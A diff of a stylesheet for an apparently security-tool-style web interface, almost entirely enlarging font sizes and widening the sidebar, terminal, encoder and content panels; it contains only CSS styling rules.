@@ -15,58 +15,58 @@
   --glow:0 0 8px rgba(0,255,136,.18);--glow-md:0 0 14px rgba(0,255,136,.22);
   --panel-bg:#050a06;--input-bg:#030604;
 }
-body{font-family:'JetBrains Mono',monospace;background:var(--bg);color:var(--txt);height:100vh;display:flex;flex-direction:column;overflow:hidden;font-size:12px}
+body{font-family:'JetBrains Mono',monospace;background:var(--bg);color:var(--txt);height:100vh;display:flex;flex-direction:column;overflow:hidden;font-size:14px}
 ::-webkit-scrollbar{width:4px;height:4px}
 ::-webkit-scrollbar-track{background:transparent}
 ::-webkit-scrollbar-thumb{background:#1e4a2a;border-radius:4px}
 ::-webkit-scrollbar-thumb:hover{background:#2a6a3a}
 
 /* ─── TOPBAR ─────────────────────────────────────────── */
-#topbar{background:linear-gradient(90deg,#040805 0%,var(--bg3) 50%,#040805 100%);border-bottom:1px solid var(--brd);box-shadow:0 1px 0 #0a1a0c,0 2px 12px rgba(0,0,0,.5);padding:0 16px;display:flex;align-items:center;gap:12px;height:38px;flex-shrink:0;position:relative;z-index:10}
+#topbar{background:linear-gradient(90deg,#040805 0%,var(--bg3) 50%,#040805 100%);border-bottom:1px solid var(--brd);box-shadow:0 1px 0 #0a1a0c,0 2px 12px rgba(0,0,0,.5);padding:0 16px;display:flex;align-items:center;gap:12px;height:50px;flex-shrink:0;position:relative;z-index:10}
 .dots{display:flex;gap:5px}
 .dot{width:9px;height:9px;border-radius:50%;box-shadow:0 0 4px rgba(0,0,0,.5)}
 .dr{background:#ff5f57;box-shadow:0 0 5px rgba(255,95,87,.4)}.dy{background:#febc2e;box-shadow:0 0 5px rgba(254,188,46,.3)}.dg{background:#28c840;box-shadow:0 0 5px rgba(40,200,64,.4)}
-#app-title{font-size:11px;color:var(--g);font-weight:700;letter-spacing:3px;flex:1;text-align:center;text-shadow:0 0 12px rgba(0,255,136,.3)}
-#app-title span{color:var(--mut);font-weight:400;font-size:8px;letter-spacing:2px;margin-left:6px}
-.tpill{font-size:7px;border:1px solid var(--brd);padding:2px 8px;border-radius:2px;letter-spacing:1px}
+#app-title{font-size:15px;color:var(--g);font-weight:700;letter-spacing:3px;flex:1;text-align:center;text-shadow:0 0 12px rgba(0,255,136,.3)}
+#app-title span{color:var(--mut);font-weight:400;font-size:13px;letter-spacing:2px;margin-left:6px}
+.tpill{font-size:12px;border:1px solid var(--brd);padding:2px 8px;border-radius:2px;letter-spacing:1px}
 #srv-status{color:#ff5050;border-color:#3a1010;background:#100404}
 #srv-status.ok{color:var(--g);border-color:#1a3a20;background:#030804;box-shadow:var(--glow)}
-#clock-pill{color:var(--mut);font-size:7px;letter-spacing:1px}
+#clock-pill{color:var(--mut);font-size:12px;letter-spacing:1px}
 
 /* ─── LAYOUT ─────────────────────────────────────────── */
 #layout{display:flex;flex:1;overflow:hidden}
 
 /* ─── SIDEBAR ────────────────────────────────────────── */
-#sidebar{width:172px;background:var(--bg2);border-right:1px solid var(--brd);overflow-y:auto;flex-shrink:0;padding-bottom:20px;display:flex;flex-direction:column}
+#sidebar{width:215px;background:var(--bg2);border-right:1px solid var(--brd);overflow-y:auto;flex-shrink:0;padding-bottom:20px;display:flex;flex-direction:column}
 .sb-brand{padding:12px 14px 10px;border-bottom:1px solid var(--brd);display:flex;flex-direction:column;gap:3px;background:linear-gradient(180deg,#070f08 0%,var(--bg2) 100%)}
-.sb-brand-name{font-size:9px;color:var(--g);font-weight:700;letter-spacing:3px;text-shadow:0 0 10px rgba(0,255,136,.25)}
-.sb-brand-by{font-size:7px;color:var(--mut);letter-spacing:2px}
+.sb-brand-name{font-size:14px;color:var(--g);font-weight:700;letter-spacing:3px;text-shadow:0 0 10px rgba(0,255,136,.25)}
+.sb-brand-by{font-size:12px;color:var(--mut);letter-spacing:2px}
 
 /* accordion */
-.acc-cat{cursor:pointer;padding:8px 12px;font-size:7px;color:var(--mut);letter-spacing:3px;display:flex;align-items:center;justify-content:space-between;user-select:none;transition:all .15s;border-bottom:1px solid #0a1209;margin-top:1px}
+.acc-cat{cursor:pointer;padding:8px 12px;font-size:12px;color:var(--mut);letter-spacing:3px;display:flex;align-items:center;justify-content:space-between;user-select:none;transition:all .15s;border-bottom:1px solid #0a1209;margin-top:1px}
 .acc-cat:hover{color:var(--g2);background:#080f09}
 .acc-cat.open{color:var(--g);background:#060d07}
-.acc-arrow{font-size:7px;transition:transform .2s;opacity:.4}
+.acc-arrow{font-size:12px;transition:transform .2s;opacity:.4}
 .acc-cat.open .acc-arrow{transform:rotate(90deg);opacity:.9}
 .acc-items{overflow:hidden;max-height:0;transition:max-height .25s ease}
 .acc-items.open{max-height:500px}
-.s-item{padding:5px 10px 5px 16px;font-size:8px;color:var(--mut);cursor:pointer;display:flex;align-items:center;gap:7px;border-left:2px solid transparent;white-space:nowrap;transition:all .12s;position:relative;letter-spacing:.5px}
+.s-item{padding:5px 10px 5px 16px;font-size:13px;color:var(--mut);cursor:pointer;display:flex;align-items:center;gap:7px;border-left:2px solid transparent;white-space:nowrap;transition:all .12s;position:relative;letter-spacing:.5px}
 .s-item:hover{color:var(--g2);background:#0a160b;border-left-color:#1a3a20}
 .s-item.active{color:var(--g);background:linear-gradient(90deg,#0d1e0f 0%,#080e09 100%);border-left-color:var(--g);box-shadow:inset 0 0 12px rgba(0,255,136,.04)}
 .s-dot{width:4px;height:4px;border-radius:50%;background:var(--dim);flex-shrink:0;transition:all .15s}
 .s-item:hover .s-dot{background:#2d6040}
 .s-item.active .s-dot{background:var(--g);box-shadow:0 0 5px rgba(0,255,136,.6)}
-.s-icon{font-size:8px;color:var(--dim);width:12px;text-align:center;flex-shrink:0;transition:color .12s}
+.s-icon{font-size:13px;color:var(--dim);width:12px;text-align:center;flex-shrink:0;transition:color .12s}
 .s-item:hover .s-icon{color:#3a6a4a}
 .s-item.active .s-icon{color:var(--g);text-shadow:0 0 6px rgba(0,255,136,.5)}
-.s-badge{margin-left:auto;font-size:6px;background:#0a1a0c;color:var(--g);border:1px solid var(--brd);border-radius:2px;padding:1px 4px;letter-spacing:1px}
+.s-badge{margin-left:auto;font-size:11px;background:#0a1a0c;color:var(--g);border:1px solid var(--brd);border-radius:2px;padding:1px 4px;letter-spacing:1px}
 
 /* ─── MAIN BODY ──────────────────────────────────────── */
 #body{display:flex;flex:1;overflow:hidden}
 #content{flex:1;overflow-y:auto;padding:18px 20px;min-width:0;background:var(--panel-bg);background-image:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,255,136,.008) 2px,rgba(0,255,136,.008) 4px)}
 
 /* ─── TWO-COLUMN PANEL LAYOUT ────────────────────────── */
-.panel.active{display:grid;grid-template-columns:1fr 340px;column-gap:18px;align-items:start}
+.panel.active{display:grid;grid-template-columns:1fr 415px;column-gap:18px;align-items:start}
 .panel.active .pt,
 .panel.active .val-msg,
 .panel.active .sdiv,
@@ -89,24 +89,24 @@ body{font-family:'JetBrains Mono',monospace;background:var(--bg);color:var(--txt
 .panel.active .enc-chain-label{grid-column:1}
 
 /* ─── TERMINAL PANEL ─────────────────────────────────── */
-#term-panel{width:300px;background:#020302;border-left:1px solid var(--brd);display:flex;flex-direction:column;flex-shrink:0;transition:width .2s ease}
+#term-panel{width:365px;background:#020302;border-left:1px solid var(--brd);display:flex;flex-direction:column;flex-shrink:0;transition:width .2s ease}
 #term-panel.collapsed{width:26px}
 #term-topbar{background:#040805;border-bottom:1px solid var(--brd);padding:6px 10px;display:flex;align-items:center;gap:7px;flex-shrink:0}
-#term-title{font-size:8px;color:var(--mut);flex:1;letter-spacing:2px;cursor:pointer;text-transform:uppercase}
+#term-title{font-size:13px;color:var(--mut);flex:1;letter-spacing:2px;cursor:pointer;text-transform:uppercase}
 #term-title:hover{color:var(--g2)}
-#term-collapse{font-size:9px;color:var(--dim);cursor:pointer;padding:0 4px;transition:color .1s}
+#term-collapse{font-size:14px;color:var(--dim);cursor:pointer;padding:0 4px;transition:color .1s}
 #term-collapse:hover{color:var(--g)}
-#term-jobs{font-size:7px;color:var(--yellow)}
+#term-jobs{font-size:12px;color:var(--yellow)}
 #term-tabs{display:flex;border-bottom:1px solid var(--brd);overflow-x:auto;flex-shrink:0;background:var(--bg2)}
-.tt{font-size:7px;padding:5px 10px;color:var(--mut);cursor:pointer;border-bottom:2px solid transparent;display:flex;align-items:center;gap:4px;white-space:nowrap;transition:all .12s;letter-spacing:.5px}
+.tt{font-size:12px;padding:5px 10px;color:var(--mut);cursor:pointer;border-bottom:2px solid transparent;display:flex;align-items:center;gap:4px;white-space:nowrap;transition:all .12s;letter-spacing:.5px}
 .tt:hover{color:var(--g2);background:#060d07}
 .tt.active{color:var(--g);border-bottom-color:var(--g)}
-.tt .tx{color:var(--dim);font-size:9px}
+.tt .tx{color:var(--dim);font-size:14px}
 .tt .tx:hover{color:var(--red)}
-#new-tt{padding:5px 8px;font-size:11px;color:var(--dim);cursor:pointer;transition:color .1s}
+#new-tt{padding:5px 8px;font-size:15px;color:var(--dim);cursor:pointer;transition:color .1s}
 #new-tt:hover{color:var(--g)}
 #term-body{flex:1;overflow:hidden;position:relative}
-.tout{position:absolute;inset:0;overflow-y:auto;padding:8px 10px;font-size:9px;line-height:1.7;display:none;font-family:'JetBrains Mono',monospace}
+.tout{position:absolute;inset:0;overflow-y:auto;padding:8px 10px;font-size:14px;line-height:1.7;display:none;font-family:'JetBrains Mono',monospace}
 .tout.active{display:block}
 .tl{white-space:pre-wrap;word-break:break-all}
 .tl.err{color:#ff7070}
@@ -116,18 +116,18 @@ body{font-family:'JetBrains Mono',monospace;background:var(--bg);color:var(--txt
 .tl.warn{color:var(--yellow)}
 .tl.sep{color:var(--dim);border-top:1px solid #0d160f;padding-top:4px;margin-top:4px}
 #term-input-row{border-top:1px solid var(--brd);display:flex;align-items:center;padding:5px 8px;gap:6px;flex-shrink:0;background:#030504}
-#term-prompt{font-size:9px;color:var(--g);white-space:nowrap;text-shadow:0 0 8px rgba(0,255,136,.3)}
-#term-input{flex:1;background:transparent;border:none;color:var(--txt);font-family:inherit;font-size:9px;outline:none}
-#term-run-btn{font-size:7px;color:var(--g);cursor:pointer;padding:3px 8px;border:1px solid var(--brd);border-radius:2px;transition:all .1s;letter-spacing:1px}
+#term-prompt{font-size:14px;color:var(--g);white-space:nowrap;text-shadow:0 0 8px rgba(0,255,136,.3)}
+#term-input{flex:1;background:transparent;border:none;color:var(--txt);font-family:inherit;font-size:14px;outline:none}
+#term-run-btn{font-size:12px;color:var(--g);cursor:pointer;padding:3px 8px;border:1px solid var(--brd);border-radius:2px;transition:all .1s;letter-spacing:1px}
 #term-run-btn:hover{background:#0a1a0c;border-color:#254530}
 
 /* ─── ENCODER AUX PANEL (right, replaces terminal) ────── */
-#enc-aux-panel{width:400px;background:#020403;border-left:1px solid var(--brd);display:none;flex-direction:column;flex-shrink:0}
+#enc-aux-panel{width:490px;background:#020403;border-left:1px solid var(--brd);display:none;flex-direction:column;flex-shrink:0}
 #enc-aux-panel.active{display:flex}
 #enc-aux-topbar{background:var(--bg3);border-bottom:1px solid var(--brd);padding:5px 8px;display:flex;align-items:center;gap:6px;flex-shrink:0}
-#enc-aux-title{font-size:8px;color:var(--cyan);flex:1;letter-spacing:1px;font-weight:700}
+#enc-aux-title{font-size:13px;color:var(--cyan);flex:1;letter-spacing:1px;font-weight:700}
 #enc-aux-tabs{display:flex;border-bottom:1px solid var(--brd);overflow-x:auto;flex-shrink:0;background:var(--bg2)}
-.elib-tab{font-size:7px;padding:4px 10px;color:var(--mut);cursor:pointer;border-bottom:2px solid transparent;white-space:nowrap;letter-spacing:1px;transition:all .1s}
+.elib-tab{font-size:12px;padding:4px 10px;color:var(--mut);cursor:pointer;border-bottom:2px solid transparent;white-space:nowrap;letter-spacing:1px;transition:all .1s}
 .elib-tab.on{color:var(--cyan);border-bottom-color:var(--cyan)}
 #enc-aux-body{flex:1;overflow-y:auto;padding:7px 9px}
 .elib-content{display:none}
@@ -137,36 +137,36 @@ body{font-family:'JetBrains Mono',monospace;background:var(--bg);color:var(--txt
 .panel{display:none}
 .panel.active{display:block;animation:panelIn .15s ease}
 @keyframes panelIn{from{opacity:.6;transform:translateY(4px)}to{opacity:1;transform:translateY(0)}}
-.pt{font-size:13px;color:var(--g);font-weight:700;margin-bottom:16px;display:flex;align-items:center;gap:10px;flex-wrap:wrap;padding-bottom:12px;border-bottom:1px solid #163019;animation:titleGlow 5s ease-in-out infinite}
+.pt{font-size:18px;color:var(--g);font-weight:700;margin-bottom:16px;display:flex;align-items:center;gap:10px;flex-wrap:wrap;padding-bottom:12px;border-bottom:1px solid #163019;animation:titleGlow 5s ease-in-out infinite}
 @keyframes titleGlow{0%,100%{text-shadow:0 0 10px rgba(0,255,136,.15)}50%{text-shadow:0 0 22px rgba(0,255,136,.35),0 0 40px rgba(0,255,136,.1)}}
 .pt::before{content:'';width:3px;height:20px;background:linear-gradient(180deg,var(--g) 0%,rgba(0,255,136,.1) 100%);border-radius:2px;flex-shrink:0;box-shadow:0 0 10px rgba(0,255,136,.5)}
-.ptd{font-size:8px;color:var(--mut);font-weight:400;letter-spacing:.5px;animation:none}
+.ptd{font-size:13px;color:var(--mut);font-weight:400;letter-spacing:.5px;animation:none}
 .row{display:flex;gap:8px;margin-bottom:8px;flex-wrap:wrap}
 .ig{display:flex;flex-direction:column;gap:4px;flex:1;min-width:70px}
 .ig.w2{flex:2}.ig.w3{flex:3}.ig.w4{flex:4}
-.lbl{font-size:7px;color:var(--mut);letter-spacing:1.5px;text-transform:uppercase}
-input.fi,select.fi,textarea.fi{background:var(--input-bg);border:1px solid var(--brd);color:var(--txt);font-family:inherit;font-size:9px;padding:5px 8px;width:100%;border-radius:3px;outline:none;transition:border .15s,box-shadow .15s}
+.lbl{font-size:12px;color:var(--mut);letter-spacing:1.5px;text-transform:uppercase}
+input.fi,select.fi,textarea.fi{background:var(--input-bg);border:1px solid var(--brd);color:var(--txt);font-family:inherit;font-size:14px;padding:5px 8px;width:100%;border-radius:3px;outline:none;transition:border .15s,box-shadow .15s}
 input.fi:hover,select.fi:hover{border-color:#254530}
 input.fi:focus,select.fi:focus,textarea.fi:focus{border-color:var(--g);box-shadow:0 0 0 2px rgba(0,255,136,.08),inset 0 1px 4px rgba(0,0,0,.4)}
 textarea.fi{resize:vertical;min-height:48px}
 .checks{display:flex;flex-wrap:wrap;gap:4px;margin-bottom:8px}
-.ck{background:var(--input-bg);border:1px solid var(--brd);border-radius:2px;padding:3px 8px;font-size:7px;color:var(--mut);cursor:pointer;user-select:none;transition:all .12s;letter-spacing:.5px}
+.ck{background:var(--input-bg);border:1px solid var(--brd);border-radius:2px;padding:3px 8px;font-size:12px;color:var(--mut);cursor:pointer;user-select:none;transition:all .12s;letter-spacing:.5px}
 .ck:hover{border-color:#2d6040;color:var(--g2);background:#080f09}
 .ck.on{background:#091509;border-color:var(--g);color:var(--g);box-shadow:inset 0 0 8px rgba(0,255,136,.06)}
 
 /* ─── CMD PREVIEW ────────────────────────────────────── */
 .cmd-preview{background:#010302;border:1px solid #1e4428;border-radius:4px;margin-top:12px;overflow:hidden;box-shadow:0 0 20px rgba(0,255,136,.06),inset 0 0 40px rgba(0,0,0,.4)}
-.cmd-lbl{background:#030806;border-bottom:1px solid #163019;padding:6px 12px;font-size:7px;color:var(--mut);letter-spacing:2px;text-transform:uppercase;display:flex;align-items:center;gap:7px}
+.cmd-lbl{background:#030806;border-bottom:1px solid #163019;padding:6px 12px;font-size:12px;color:var(--mut);letter-spacing:2px;text-transform:uppercase;display:flex;align-items:center;gap:7px}
 .cmd-lbl::before{content:'';width:6px;height:6px;border-radius:50%;background:var(--g);box-shadow:0 0 6px rgba(0,255,136,.6);flex-shrink:0}
-.cmd-lbl::after{content:'COMMAND';margin-left:auto;font-size:6px;color:var(--dim);letter-spacing:3px}
-.cmd-text{color:var(--g2);word-break:break-all;line-height:2;font-size:11px;min-height:20px;padding:10px 14px;font-family:'JetBrains Mono',monospace}
+.cmd-lbl::after{content:'COMMAND';margin-left:auto;font-size:11px;color:var(--dim);letter-spacing:3px}
+.cmd-text{color:var(--g2);word-break:break-all;line-height:2;font-size:15px;min-height:20px;padding:10px 14px;font-family:'JetBrains Mono',monospace}
 .cmd-text .b{color:var(--g);font-weight:700;text-shadow:0 0 8px rgba(0,255,136,.3)}
 .cmd-text .f{color:var(--cyan)}
 .cmd-text .v{color:var(--ora)}
 
 /* ─── RUN BUTTONS ────────────────────────────────────── */
 .run-row{display:flex;align-items:center;gap:10px;margin-top:14px;flex-wrap:wrap;padding-top:12px;border-top:1px solid #0d1a0f}
-.rbtn{background:linear-gradient(180deg,#0f2412 0%,#07120a 100%);border:1px solid var(--g);color:var(--g);font-family:inherit;font-size:9px;padding:9px 24px;border-radius:3px;cursor:pointer;letter-spacing:2px;transition:all .2s;display:flex;align-items:center;gap:7px;box-shadow:0 0 12px rgba(0,255,136,.15),inset 0 1px 0 rgba(0,255,136,.12);position:relative;overflow:hidden}
+.rbtn{background:linear-gradient(180deg,#0f2412 0%,#07120a 100%);border:1px solid var(--g);color:var(--g);font-family:inherit;font-size:14px;padding:9px 24px;border-radius:3px;cursor:pointer;letter-spacing:2px;transition:all .2s;display:flex;align-items:center;gap:7px;box-shadow:0 0 12px rgba(0,255,136,.15),inset 0 1px 0 rgba(0,255,136,.12);position:relative;overflow:hidden}
 .rbtn::after{content:'';position:absolute;inset:0;background:linear-gradient(90deg,transparent 0%,rgba(0,255,136,.04) 50%,transparent 100%);transform:translateX(-100%);transition:transform .4s}
 .rbtn:hover{background:linear-gradient(180deg,#162e18 0%,#0d1e0f 100%);box-shadow:0 0 22px rgba(0,255,136,.28),inset 0 1px 0 rgba(0,255,136,.2);transform:translateY(-1px)}
 .rbtn:hover::after{transform:translateX(100%)}
@@ -175,10 +175,10 @@ textarea.fi{resize:vertical;min-height:48px}
 .rbtn.running::before{content:'';width:6px;height:6px;border:1.5px solid var(--yellow);border-top-color:transparent;border-radius:50%;animation:spin .6s linear infinite;flex-shrink:0}
 @keyframes spin{to{transform:rotate(360deg)}}
 @keyframes btnPulse{0%,100%{box-shadow:0 0 12px rgba(0,255,136,.15)}50%{box-shadow:0 0 22px rgba(0,255,136,.3)}}
-.sbtn{background:#100404;border:1px solid #4a1818;color:#cc5050;font-family:inherit;font-size:8px;padding:8px 16px;border-radius:3px;cursor:pointer;letter-spacing:1.5px;transition:all .15s}
+.sbtn{background:#100404;border:1px solid #4a1818;color:#cc5050;font-family:inherit;font-size:13px;padding:8px 16px;border-radius:3px;cursor:pointer;letter-spacing:1.5px;transition:all .15s}
 .sbtn:hover{background:#1c0606;border-color:var(--red);color:var(--red);box-shadow:0 0 10px rgba(255,79,79,.1)}
 .sbtn:disabled{opacity:.25;cursor:not-allowed}
-.kbtn{background:var(--input-bg);border:1px solid var(--brd);color:var(--mut);font-family:inherit;font-size:7px;padding:5px 11px;border-radius:3px;cursor:pointer;letter-spacing:1px;transition:all .12s}
+.kbtn{background:var(--input-bg);border:1px solid var(--brd);color:var(--mut);font-family:inherit;font-size:12px;padding:5px 11px;border-radius:3px;cursor:pointer;letter-spacing:1px;transition:all .12s}
 .kbtn:hover{color:var(--g2);border-color:#254530;background:#070f08}
 .kbtn.ok{color:var(--g);background:#070e08;border-color:#1e4428}
 
@@ -187,42 +187,42 @@ textarea.fi{resize:vertical;min-height:48px}
 .out-hdr{background:#040805;border-bottom:1px solid var(--brd);padding:5px 10px;display:flex;align-items:center;gap:8px}
 .out-hdr::before{content:'';width:6px;height:6px;border-radius:50%;background:#1a3a20;border:1px solid #2a5030;flex-shrink:0}
 .out-area[style*="block"] .out-hdr::before,.out-area.active .out-hdr::before{background:var(--g);box-shadow:0 0 5px rgba(0,255,136,.5);border-color:var(--g)}
-.out-title{font-size:7px;color:var(--mut);letter-spacing:2px;flex:1;text-transform:uppercase}
-.out-content{padding:9px 11px;max-height:250px;overflow-y:auto;font-size:9px;line-height:1.7;color:#9dccb0;white-space:pre-wrap;word-break:break-all;font-family:'JetBrains Mono',monospace}
+.out-title{font-size:12px;color:var(--mut);letter-spacing:2px;flex:1;text-transform:uppercase}
+.out-content{padding:9px 11px;max-height:250px;overflow-y:auto;font-size:14px;line-height:1.7;color:#9dccb0;white-space:pre-wrap;word-break:break-all;font-family:'JetBrains Mono',monospace}
 .out-err{color:#ff7070}
 .out-ok{color:var(--g)}
 .out-sys{color:var(--mut);font-style:italic}
 
 /* ─── PARSED OUTPUT ─────────────────────────────────── */
 .out-tab-row{display:flex;gap:1px;background:#020302;border-radius:2px;padding:1px;margin-right:4px}
-.out-tab{font-size:7px;padding:2px 10px;color:var(--mut);cursor:pointer;letter-spacing:1px;border-radius:2px;transition:all .12s;border:1px solid transparent}
+.out-tab{font-size:12px;padding:2px 10px;color:var(--mut);cursor:pointer;letter-spacing:1px;border-radius:2px;transition:all .12s;border:1px solid transparent}
 .out-tab:hover{color:var(--g2);background:#080f09}
 .out-tab.on{color:#000;background:var(--g);border-color:var(--g);font-weight:700}
 .out-parsed{padding:10px 12px;max-height:330px;overflow-y:auto;display:none}
 .p-summary{display:flex;flex-wrap:wrap;gap:5px;margin-bottom:10px}
-.p-pill{font-size:7px;padding:3px 8px;border-radius:2px;border:1px solid var(--brd);color:var(--mut);background:#050905;white-space:nowrap;letter-spacing:.5px}
+.p-pill{font-size:12px;padding:3px 8px;border-radius:2px;border:1px solid var(--brd);color:var(--mut);background:#050905;white-space:nowrap;letter-spacing:.5px}
 .p-pill.ok{color:var(--g);border-color:#183320;background:#030704}
 .p-pill.warn{color:var(--yellow);border-color:#3a2d08;background:#080700}
 .p-pill.crit{color:var(--red);border-color:#3a1010;background:#060202}
 .p-pill.info{color:var(--cyan);border-color:#163340;background:#020508}
 .p-section{margin-bottom:12px}
-.p-sec-hdr{font-size:7px;color:var(--mut);letter-spacing:2px;margin-bottom:5px;padding-bottom:3px;border-bottom:1px solid #0d160f;text-transform:uppercase}
-.p-sec-body{font-size:8px}
+.p-sec-hdr{font-size:12px;color:var(--mut);letter-spacing:2px;margin-bottom:5px;padding-bottom:3px;border-bottom:1px solid #0d160f;text-transform:uppercase}
+.p-sec-body{font-size:13px}
 .p-table{width:100%}
-.p-hrow .p-cell{color:var(--mut);font-size:7px;letter-spacing:1px;text-transform:uppercase}
+.p-hrow .p-cell{color:var(--mut);font-size:12px;letter-spacing:1px;text-transform:uppercase}
 .p-row{display:flex;gap:6px;padding:3px 0;border-bottom:1px solid #070d08;flex-wrap:wrap;transition:background .08s}
 .p-row:hover{background:#060d07}
-.p-cell{flex:1;min-width:50px;color:var(--txt);word-break:break-all;font-family:'JetBrains Mono',monospace;font-size:8px}
-.p-find{font-size:8px;padding:3px 8px;border-left:2px solid var(--brd);margin-bottom:3px;font-family:'JetBrains Mono',monospace;word-break:break-all;color:var(--txt);border-radius:0 2px 2px 0;background:#030604}
+.p-cell{flex:1;min-width:50px;color:var(--txt);word-break:break-all;font-family:'JetBrains Mono',monospace;font-size:13px}
+.p-find{font-size:13px;padding:3px 8px;border-left:2px solid var(--brd);margin-bottom:3px;font-family:'JetBrains Mono',monospace;word-break:break-all;color:var(--txt);border-radius:0 2px 2px 0;background:#030604}
 .p-find.ok{border-color:var(--g);color:var(--g2);background:#030704}
 .p-find.warn{border-color:var(--yellow);color:var(--yellow);background:#060600}
 .p-find.crit{border-color:var(--red);color:#ff9090;background:#060202}
 .p-find.info{border-color:var(--cyan);color:var(--cyan);background:#020508}
-.p-empty{font-size:8px;color:var(--dim);padding:18px;text-align:center;font-style:italic;letter-spacing:1px}
+.p-empty{font-size:13px;color:var(--dim);padding:18px;text-align:center;font-style:italic;letter-spacing:1px}
 
 /* ─── TABS ───────────────────────────────────────────── */
 .tabs{display:flex;flex-wrap:wrap;margin-bottom:9px;border-bottom:1px solid var(--brd)}
-.tab{font-size:7px;padding:4px 10px;color:var(--mut);cursor:pointer;border-bottom:2px solid transparent;letter-spacing:1px;transition:all .1s}
+.tab{font-size:12px;padding:4px 10px;color:var(--mut);cursor:pointer;border-bottom:2px solid transparent;letter-spacing:1px;transition:all .1s}
 .tab.on{color:var(--g);border-bottom-color:var(--g)}
 .tab-content:not(.on){display:none!important}
 .tab-content.on{display:block}
@@ -232,85 +232,85 @@ textarea.fi{resize:vertical;min-height:48px}
 .plist{display:flex;flex-direction:column;gap:3px}
 .pitem{display:flex;align-items:center;background:#020403;border:1px solid var(--brd);border-radius:3px;padding:5px 9px;gap:7px;transition:border .1s}
 .pitem:hover{border-color:#2d4a35}
-.ptxt{font-size:9px;color:var(--g2);flex:1;word-break:break-all;line-height:1.5}
-.pcopy{font-size:7px;color:var(--g);cursor:pointer;padding:2px 6px;border:1px solid var(--brd);border-radius:2px;flex-shrink:0;white-space:nowrap}
+.ptxt{font-size:14px;color:var(--g2);flex:1;word-break:break-all;line-height:1.5}
+.pcopy{font-size:12px;color:var(--g);cursor:pointer;padding:2px 6px;border:1px solid var(--brd);border-radius:2px;flex-shrink:0;white-space:nowrap}
 .pcopy:hover{background:#0a1a0c}
 .pcopy.ok{color:#fff;background:#152815}
 
 /* ─── HTABLE ─────────────────────────────────────────── */
-.htable{width:100%;border-collapse:collapse;font-size:8px}
-.htable th{color:var(--mut);padding:5px 8px;text-align:left;border-bottom:1px solid var(--brd);letter-spacing:1.5px;text-transform:uppercase;font-size:7px}
+.htable{width:100%;border-collapse:collapse;font-size:13px}
+.htable th{color:var(--mut);padding:5px 8px;text-align:left;border-bottom:1px solid var(--brd);letter-spacing:1.5px;text-transform:uppercase;font-size:12px}
 .htable td{color:var(--g2);padding:4px 8px;border-bottom:1px solid #070d08}
 .htable tr:hover td{background:#070e08}
 .hmatch{color:var(--g);font-weight:700}
 
 /* ─── CURL SPECIAL ───────────────────────────────────── */
-#curl-resp-status{font-size:16px;font-weight:700;padding:4px 0;margin-bottom:6px}
-#curl-resp-headers{background:#020403;border:1px solid var(--brd);border-radius:3px;padding:7px;font-size:8px;color:var(--cyan);max-height:120px;overflow-y:auto;margin-bottom:6px;white-space:pre-wrap}
-#curl-resp-body{background:#020403;border:1px solid var(--brd);border-radius:3px;padding:7px;font-size:9px;color:var(--g2);max-height:220px;overflow-y:auto;white-space:pre-wrap;word-break:break-all}
+#curl-resp-status{font-size:22px;font-weight:700;padding:4px 0;margin-bottom:6px}
+#curl-resp-headers{background:#020403;border:1px solid var(--brd);border-radius:3px;padding:7px;font-size:13px;color:var(--cyan);max-height:120px;overflow-y:auto;margin-bottom:6px;white-space:pre-wrap}
+#curl-resp-body{background:#020403;border:1px solid var(--brd);border-radius:3px;padding:7px;font-size:14px;color:var(--g2);max-height:220px;overflow-y:auto;white-space:pre-wrap;word-break:break-all}
 .headers-editor{display:flex;flex-direction:column;gap:4px;margin-bottom:8px}
 .header-row{display:flex;gap:6px;align-items:center}
 .header-row input{flex:1}
-.header-row .del-btn{color:var(--red);cursor:pointer;font-size:10px;padding:0 4px;flex-shrink:0;border:none;background:none}
+.header-row .del-btn{color:var(--red);cursor:pointer;font-size:14px;padding:0 4px;flex-shrink:0;border:none;background:none}
 .header-row .del-btn:hover{opacity:.7}
 
 /* ─── SDIV ───────────────────────────────────────────── */
-.sdiv{font-size:7px;color:var(--mut);letter-spacing:3px;margin:12px 0 7px;padding-bottom:4px;border-bottom:1px solid #0d160f;text-transform:uppercase}
+.sdiv{font-size:12px;color:var(--mut);letter-spacing:3px;margin:12px 0 7px;padding-bottom:4px;border-bottom:1px solid #0d160f;text-transform:uppercase}
 
 /* ─── STATUSBAR ──────────────────────────────────────── */
-#statusbar{background:#030604;border-top:1px solid var(--brd);padding:3px 14px;display:flex;justify-content:space-between;align-items:center;font-size:7px;color:var(--dim);flex-shrink:0;letter-spacing:.5px}
+#statusbar{background:#030604;border-top:1px solid var(--brd);padding:3px 14px;display:flex;justify-content:space-between;align-items:center;font-size:12px;color:var(--dim);flex-shrink:0;letter-spacing:.5px}
 .sb-warn{color:#cc6020}
 .sb-right{display:flex;gap:14px;align-items:center}
 .sb-brand{color:var(--dim);letter-spacing:1px}
 
 /* ─── OFFLINE NOTICE ─────────────────────────────────── */
-#offline-bar{background:#0a0500;border-bottom:1px solid #3a2010;padding:5px 14px;font-size:8px;color:var(--yellow);display:none;align-items:center;gap:8px}
+#offline-bar{background:#0a0500;border-bottom:1px solid #3a2010;padding:5px 14px;font-size:13px;color:var(--yellow);display:none;align-items:center;gap:8px}
 #offline-bar a{color:var(--cyan);cursor:pointer;text-decoration:underline}
 
 /* ─── TOOL STATUS ─────────────────────────────────────── */
 .tool-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(140px,1fr));gap:4px}
 .tc{background:var(--input-bg);border:1px solid var(--brd);border-radius:3px;padding:6px 10px;display:flex;align-items:center;gap:8px;transition:border .12s}
 .tc:hover{border-color:#1e4030}
-.tc .tn{font-size:8px;color:var(--txt);flex:1;letter-spacing:.5px}
+.tc .tn{font-size:13px;color:var(--txt);flex:1;letter-spacing:.5px}
 .tc .ts{width:6px;height:6px;border-radius:50%;background:var(--dim);flex-shrink:0;transition:all .2s}
 .tc .ts.ok{background:var(--g);box-shadow:0 0 5px rgba(0,255,136,.4)}
 .tc .ts.err{background:#6a2020}
 
 /* ─── VALIDATION MSG ─────────────────────────────────── */
-.val-msg{font-size:8px;padding:6px 10px;border-radius:3px;margin-bottom:8px;display:none;border-left-width:2px;letter-spacing:.5px}
+.val-msg{font-size:13px;padding:6px 10px;border-radius:3px;margin-bottom:8px;display:none;border-left-width:2px;letter-spacing:.5px}
 .val-msg.err{background:#150505;border:1px solid #5a1818;border-left-color:var(--red);color:#ff9090}
 .val-msg.warn{background:#100f03;border:1px solid #4a3c08;border-left-color:var(--yellow);color:var(--yellow)}
